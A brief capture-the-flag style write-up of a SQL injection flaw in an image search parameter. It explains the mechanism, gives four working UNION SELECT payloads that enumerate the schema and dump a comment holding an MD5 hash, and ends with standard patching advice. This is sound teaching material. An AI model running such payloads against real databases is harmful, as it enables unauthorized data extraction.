# Exploit

## Basic Mechanism

This vulnerability exploits an unsanitized search parameter in an image search feature:

1. The web application has a search feature for images
1. User input is directly incorporated into SQL queries without proper sanitization
1. An attacker can inject malicious SQL commands after legitimate input
1. The database executes these commands as if they were part of the original query
1. This allows the attacker to:
    - Extract database schema information
    - Access sensitive data
    - Potentially modify or delete data

## What can this do?

SQL injection vulnerabilities can have severe consequences:
- Bypass authentication
- Access sensitive data (user credentials, personal information)
- Extract database structure and contents
- Modify or delete data in the database
- Execute administrative operations on the database
- In some cases, gain control over the underlying server

## What we did

1. `1 union all select database(), version()` to get the database name and it's version: `Member_images`
2. `1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database()` to get tables name: `list_images`
3. We hex-encode the table name and use `1 union all select 1,group_concat(column_name) from Information_schema.columns where table_name=0x6C6973745F696D61676573` to get the columns: `id,url,title,comment`
4. `1 union all select 1,group_concat(comment,0x0a) from list_images` -> `1928e8083cf461a51303633093573c46` that we paste in google and it gives us `albatroz`

# Patch

- Use Parameterized Queries/Prepared Statements: Never concatenate user input directly into SQL
- Input Validation: Validate that inputs match expected formats (numbers, dates, etc.)
- ORM (Object-Relational Mapping): Use frameworks that handle SQL securely
- Least Privilege: Run database connections with minimal required permissions
- Web Application Firewall: Add an extra layer to filter malicious patterns
- Escape Special Characters: If parameterized queries aren't possible, escape inputs
- Error Handling: Don't expose SQL errors to users